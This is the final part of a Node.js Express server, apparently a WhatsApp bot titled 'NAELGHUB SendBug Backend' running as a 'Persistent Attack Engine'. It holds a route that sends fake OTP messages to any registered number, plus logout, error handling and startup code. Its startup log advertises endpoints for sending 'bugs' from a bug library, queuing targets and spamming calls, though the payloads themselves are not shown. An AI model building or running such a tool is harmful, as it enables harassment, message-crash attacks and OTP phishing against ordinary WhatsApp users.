        const code = otp || Math.floor(100000 + Math.random() * 900000);
        text = `🔐 Kode OTP: *${code}*\n\nJangan berikan ke siapapun.`;
    }
    try {
        const check = await sock.onWhatsApp(clean);
        if (!check?.[0]?.exists) return res.status(404).json({ error: 'Nomor tidak terdaftar' });
        await sock.sendMessage(jid, { text });
        res.json({ success: true, target: jid, message: text, from: connectedNumber });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

/* ============================================================
   LOGOUT
   ============================================================ */
app.post('/api/logout', async (req, res) => {
    try {
        if (sock) await sock.logout();
        isConnected = false;
        connectedNumber = null;
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

/* ============================================================
   404 + ERROR
   ============================================================ */
app.use((req, res) => res.status(404).json({ error: 'Not found' }));
app.use((err, req, res, next) => {
    console.error('[ERROR]', err);
    res.status(500).json({ error: err.message || 'Internal error' });
});

/* ============================================================
   START
   ============================================================ */
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n🚀 NAELGHUB SendBug Backend v12.0`);
    console.log(`   Port: ${PORT}`);
    console.log(`   Bugs: ${Object.keys(BUG_LIBRARY).length}`);
    console.log(`   Mode: Persistent Attack Engine`);
    console.log(`   Endpoints:`);
    console.log(`     GET  /api/health`);
    console.log(`     GET  /api/status`);
    console.log(`     GET  /api/qr`);
    console.log(`     GET  /api/bugs`);
    console.log(`     GET  /api/queue`);
    console.log(`     GET  /api/history/:phone`);
    console.log(`     POST /api/pair`);
    console.log(`     POST /api/sendbug`);
    console.log(`     POST /api/queue/add`);
    console.log(`     POST /api/queue/remove`);
    console.log(`     POST /api/queue/clear`);
    console.log(`     POST /api/spamcall`);
    console.log(`     POST /api/sendotp`);
    console.log(`     POST /api/logout\n`);

    loadQueue();
    loadHistory();
    startWhatsApp();
});

process.on('SIGINT', async () => {
    console.log('\n[SHUTDOWN]');
    saveQueue();
    saveHistory();
    try { if (sock) await sock.end(); } catch {}
    process.exit(0);
});